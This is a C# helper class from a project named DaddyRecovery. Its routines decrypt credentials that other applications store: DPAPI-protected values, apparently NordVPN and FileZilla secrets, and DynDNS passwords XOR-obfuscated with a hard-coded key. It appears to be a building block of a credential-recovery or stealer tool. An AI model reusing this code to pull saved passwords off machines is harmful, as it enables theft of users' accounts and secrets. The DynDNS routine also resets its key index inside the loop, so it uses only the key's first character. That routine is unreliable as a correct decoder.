namespace DaddyRecovery.Helpers
{
    using System;
    using System.Collections.Generic;
    using System.Globalization;
    using System.Linq;
    using System.Security.Cryptography;
    using System.Text;

    public static class DecryptTools
    {
        public static string DecryptValue(byte[] evalue, DataProtectionScope scope, byte[] oenropy)
        {
            string result = string.Empty;
            try
            {
                result = Encoding.UTF8.GetString(ProtectedData.Unprotect(evalue, oenropy, scope)).TrimEnd('\0');
            }
            catch { }

            return result;
        }

        public static string DecodeNord(string encrypted_value, DataProtectionScope scope)
        {
            string result = string.Empty;
            if (!string.IsNullOrWhiteSpace(encrypted_value))
            {
                try
                {
                    result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(encrypted_value), null, scope)).TrimEnd('\0');
                }
                catch { }
            }
            return result;
        }

        public static string DecryptFZ(string Text)
        {
            string result = string.Empty;
            if (!string.IsNullOrWhiteSpace(Text))
            {
                try
                {
                    result = Encoding.UTF8.GetString(Convert.FromBase64String(Text));
                }
                catch { }
            }
            return result;
        }

        public static string DecryptDynDns(string encrypted)
        {
            string decoded = string.Empty;
            for (int i = 0; i < encrypted.Length; i += 2)
                decoded += (char)int.Parse(encrypted.Substring(i, 2), NumberStyles.HexNumber);

            char[] outcome = decoded.ToCharArray(), chars = new char[decoded.Length];
            for (int i = 0; i < chars.Length; i++)
            {
                try
                {
                    int lPtr = 0;
                    chars[i] = (char)(outcome[i] ^ Convert.ToChar("t6KzXhCh".Substring(lPtr, 1)));
                    lPtr = (lPtr + 1) % 8;
                }
                catch (Exception) { continue; }
            }
            return new string(chars);
        }
    }
}